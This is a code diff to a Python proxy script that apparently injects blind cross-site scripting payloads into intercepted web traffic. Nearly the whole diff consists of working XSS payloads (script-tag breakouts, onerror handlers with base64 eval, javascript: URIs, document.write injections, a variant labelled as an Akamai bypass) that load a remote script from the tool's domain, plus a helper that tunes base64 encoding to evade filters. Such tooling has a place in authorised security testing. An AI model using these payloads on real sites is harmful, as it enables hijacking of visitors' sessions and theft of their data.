@@ -29,14 +29,14 @@ except IOError:
 futures_sess = FuturesSession()
 
 def payload_id_to_payload( payload_id, payload_token ):
-    js_attrib_js = 'var a=document.createElement("script");a.src="https://' + settings["domain"] + '/' + payload_token + '";document.body.appendChild(a);'
+    js_attrib_js = 'var a=document.createElement("script");a.src="https://' + settings["domain"] + '/' + payload_token + '";document.head.appendChild(a);'
 
     if payload_id == "generic_script_tag_payload":
         return "\"><script src=https://" + settings["domain"] + '/' + payload_token + "></script>"
     elif payload_id == "image_tag_payload":
         return "\"><img src=x id=" + html_escape( base64.b64encode( js_attrib_js ) ) + " onerror=eval(atob(this.id))>";
     elif payload_id == "javascript_uri_payload":
-        return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + settings["domain"] + '/' + payload_token + "\\';document.body.appendChild(a)')";
+        return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + settings["domain"] + '/' + payload_token + "\\';document.head.appendChild(a)')";
     elif payload_id == "input_tag_payload":
         return "\"><input onfocus=eval(atob(this.id)) id=" + html_escape( base64.b64encode( js_attrib_js ) ) + " autofocus>";
     elif payload_id == "source_tag_payload":
@@ -49,8 +49,61 @@ def payload_id_to_payload( payload_id, payload_token ):
         return '<script>$.getScript("//' + settings["domain"] + '/' + payload_token + '")</script>'
     elif payload_id == "getscript_from_js_payload":
 	return "\";jQuery.getScript(\"//{domain}/{token}\");//".format(domain=settings['domain'], token=payload_token)
+    elif payload_id == "js_akamai_bypass_payload":
+	return "\";var a=document.createElement(\"script\");a.setAttribute(\"src\",\"//{domain}/{token}\");document.head.appendChild(a);//".format(domain=settings['domain'], token=payload_token)
+    elif payload_id == "data_url_payload":
+	base = "13<script src=\"{proto}//{domain}/{token}{pad}\"></script><script>setTimeout(function(){{window.location=\"https://www.yahoo.com\"}},4000);</script>37"
+	return "data:a;base64,"+base64_injection_str(base, payload_token)
+    elif payload_id == "js_uri_write_payload":
+	base = "13<script src={proto}//{domain}/{token}{pad}></script><script>setTimeout(function(){{window.location=\'https://www.yahoo.com\'}},4000);</script>37"
+	return 'javascript:document.write(atob(\''+base64_injection_str(base, payload_token)+'\'));'
+    elif payload_id == "js_write_payload":
+        base = "13<script src={proto}//{domain}/{token}{pad}></script>37"
+        return '";document.write(atob("'+base64_injection_str(base, payload_token)+'"));//'
+    elif payload_id == "img_write_payload":
+	base = "13<script src={proto}//{domain}/{token}{pad}></script>37"
+	return '";</script><img id='+base64_injection_str(base, payload_token)+' src=x onerror=document.write(atob(this.id))>'
+    elif payload_id == "apos_script_payload":
+	return "'><script src=//{domain}/{token}></script>".format(domain=settings['domain'], token=payload_token)
     else:
         return "\"><script src=https://" + settings["domain"] + '/' + payload_token + "></script>"
+
+def base64_injection_str( template, payload_token ):
+        script = template.format(proto='', domain=settings['domain'], token='', pad='')
+        enc = base64.b64encode(script)
+        if enc.find('+') != -1:
+                script = template.format(proto='', domain=settings['domain'], token=payload_token, pad='')
+                enc = base64.b64encode(script)
+                if enc.find('+') != -1:
+                        script = template.format(proto='https', domain=settings['domain'], token='', pad='')
+                        enc = base64.b64encode(script)
+                        if enc.find('+') != -1:
+                                script = template.format(proto='https', domain=settings['domain'], token=payload_token, pad='')
+                                enc = base64.b64encode(script)
+                                if enc.find('+') != -1:
+                                        script = template.format(proto='https', domain=settings['domain'], token=payload_token, pad='?aaa')
+                                        return html_escape(base64.b64encode(script)) # Give up and return
+                                else:
+                                        return html_escape(enc)
+                        else:
+                                script = template.format(proto='https', domain=settings['domain'], token=payload_token, pad='')
+                                enc = base64.b64encode(script)
+                                if enc.find('+') != -1:
+                                        script = template.format(proto='https', domain=settings['domain'], token=payload_token, pad='?aaa')
+                                        return html_escape(base64.b64encode(script)) # Give up and return
+                                else:
+                                        return html_escape(enc)
+                else:
+                        return html_escape(enc)
+
+        else:
+                script = template.format(proto='', domain=settings['domain'], token=payload_token, pad='')
+                enc = base64.b64encode(script)
+                if enc.find('+') != -1:
+                        script = template.format(proto='', domain=settings['domain'], token=payload_token, pad='?aaa')
+                        return html_escape(base64.b64encode(script)) # Give up and return 
+                else:
+                        return html_escape(enc)
 
 def request( context, flow ):
     probe_ids = []
@@ -139,8 +192,6 @@ def notify_probe_server(request_details, context):
             headers={"Accept": "application/json"},
             json=request_details
     )
-    debugit(request_details)
-    debugit('\n\n')
     fut.add_done_callback(lambda x: probe_sent_cb(x, context))
 
 
